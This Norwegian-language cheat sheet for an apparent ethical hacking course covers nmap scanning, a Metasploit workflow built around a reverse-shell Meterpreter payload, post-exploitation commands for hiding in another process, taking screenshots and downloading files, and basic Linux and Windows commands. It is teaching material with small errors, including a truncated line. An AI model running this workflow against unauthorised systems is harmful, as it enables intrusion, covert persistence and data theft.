# **Ethical Hacking 101 - Cheat Sheet**

### Nmap (Network Mapper)

Nmap er et åpen kildekode nettverksskanner verktøy brukt til å oppdage enheter og tjenester på et datanettverk, og gir sikkerhetsteam muligheten til å identifisere ulike sikkerhetssvakheter i nettverkskonfigurasjonen.

- `nmap -sS <target ip>`: Utfører en TCP SYN scan (også kjent som en "stealth scan") på målet, som prøver å finne åpne porter uten å fullføre TCP håndtrykket.
- `nmap -p 1-65535 <target ip>`: Skanner alle mulige porter (1 til 65535) på målets IP-adresse for å finne åpne tjenester.
- `nmap -sV <target ip>`: Oppdager hvilke versjoner av tjenester som kjører på åpne porter ved å sende spesifikke forespørsler og analysere svarene.
- `nmap -O <target ip>`: Prøver å bestemme operativsystemet som kjører på målet basert på karakteristikker i nettverkspakkene det svarer med.
- `nmap -sV -O -p 1-65535 <target ip>`: Kombinerer funksjonene ovenfor for en grundig skanning som identifiserer åpne porter, tjenestenes versjoner, og operativsystemet.

### Msfconsole (Metasploit Framework)

Metasploit Framework er en åpen kildekode plattform for å utvikle, teste og utføre exploits mot et mål. Det er et essensielt verktøy for sikkerhetstestere for å identifisere og utnytte sårbarheter. MERK kommandoene under må utføres i rekkefølgen de er gitt!

- `msfconsole`: Starter Metasploit Command Line Interface (CLI), som er hovedgrensesnittet for å interagere med Metasploit.
- `search <exploit>`: Brukes til å søke gjennom Metasploits database for spesifikke exploits basert på nøkkelord.
- `use <exploit>`: Velger en spesifikk exploit du ønsker å bruke fra søket.
- `set PAYLOAD <payload_name>`: Definerer hvilken payload du ønsker å sende til målet etter at exploit er vellykket. Payloads kan gi deg en shell eller annen kontroll over målsystemet. Det lønner seg og velge payloden `java/meterpreter/reverse_tcp`
- `set RHOSTS <target>`: Angir målets IP-adresse eller vertsnavn.
- `set LHOST <local>`: Setter din lokale IP-adresse, som er adressen tilbakekoblinger fra målet vil bli sendt til.
- `exploit`: Utfører den valgte exploit mot målet med den konfigurerte payloaden.
- `sessions`: Viser en liste over alle aktive sesjoner. Dette inkluderer Meterpreter-sesjoner og shell-sesjoner som du har oppnådd gjennom ulike exploits. Kommandoen lar deg se detaljer om hver sesjon, som sesjonsnummer, type, informasjon om målet, og mer.
- For å bytte til en bestemt sesjon, bruk `sessions -i <session number>`, hvor `<session number>` er nummeret på sesjonen du ønsker å bytte til.
- `session -u <session number>`: Oppgraderer en gitt shell-sesjon til en Meterpreter-sesjon. Dette er spesielt nyttig hvis du først har oppnådd en enkel kommandolinje-shell på et mål, og ønsker å utnytte de mer avanserte funksjonene som tilbys av Meterpreter. Denne kommandoen forsøker å injisere en Meterpreter-payload i den eksisterende sesjonen for å oppgradere den.

### Meterpreter

Meterpreter er en avansert payload under Metasploit som gir en interaktiv kommandolinje (shell) på målsystemet, og tilbyr omfattende kontroll over målet.

- `getuid`: Viser identiteten til brukeren som Meterpreter-sesjonen kjører under på målsystemet.
- `sysinfo`: Gir detaljert informasjon om målsystemet, som operativsystem og maskinvare.
- `migrate <PID>`: Lar deg migrere Meterpreter-prosessen til en annen kjørende prosess på målsystemet, identifisert ved dens prosess-ID (PID), noe som kan hjelpe med å opprettholde tilgangen skjult.
- `screenshot`: Tar et skjermbilde av målets skjerm, noe som er nyttig for å samle bevis eller forstå brukerens aktiviteter.
- `ps`: Viser en liste over kjørende prosesser på målsystemet, noe som er kritisk for å velge en prosess for migrering eller forstå systemets bruk.
- `download <file/path>`: Lar deg laste ned filer eller hele kataloger fra målsystemet til din lokale maskin for videre analyse.
- `background` eller `bg`: Denne kommandoen brukes for å sende den aktive Meterpreter-sesjonen til bakgrunnen. Dette er nyttig når du ønsker å fortsette å arbeide i msfconsole uten å avslutte den aktive sesjonen.

### Linux Terminal Kommandoer

Linux-terminalen er et kraftig verktøy for å navigere og administrere Linux-systemer gjennom kommandolinjen.

- `pwd`: Står for "Print Working Directory" og viser den fullstendige banen til gjeldende katalog du befinner deg i.
- `ls`: Lister opp alle filer og mapper i den gjeldende katalogen. Bruk `ls -la` for å vise detaljert informasjon inkludert skjulte filer.
- `uname -a`: Viser all tilgjengelig systeminformasjon, inkludert kernel name, versjon, og maskinarkitektur.
- `whoami`: Viser brukernavnet til den gjeldende brukeren logget inn i terminalen.
- `cd <directory>`: Endrer den gjeldende katalogen til en spesifisert katalog. `cd ..` brukes for å gå tilbake til overordnet katalog.
- `mkdir <directory>`: Oppretter en ny katalog med det angitte navnet.
- `rmdir <directory>`: Sletter en tom katalog.
- `touch <file>`: Oppretter en ny tom fil eller oppdaterer tidsstempelet på en eksisterende fil uten å endre innholdet.
- `rm <file>`: Sletter en fil. Bruk `rm -r <directory>` for å rekursivt slette en katalog og alt dens innhold.
- `cat <file>`: Viser innholdet av en fil i terminalvinduet.

### Windows Terminal Kommandolinje (CMD)

Windows CMD tilbyr kommandolinje tilgang for å utføre ulike operasjoner og administrere Windows-operativsystemet.

- `cd`: Endrer den gjeldende katalogen. `cd /` tar deg til roten av stasjonen / disken.
- `dir`: Viser en liste over filer og mapper i den gjeldende katalogen.
- `ipconfig`: Viser nettverkskonfigurasjonen, inkludert IP-adresser for alle nettverkskort. `ipconfig /all` gir detaljert informasjon om hver adapter.
- `ping <address>`: Tester nettverksforbindelsen til en spesifikk IP-adresse eller vertsnavn.
- `net user`: Viser eller endrer brukerkontoer på systemet.
- `systeminfo`: Gir detalj
- `del <file>`: Sletter en fil. Bruk `rmdir /s <directory>` for å slette en katalog og dens innhold.
- `copy <source> <destination>`: Kopierer filer fra en plassering til en annen.
- `move <source> <destination>`: Flytter filer fra en plassering til en annen.
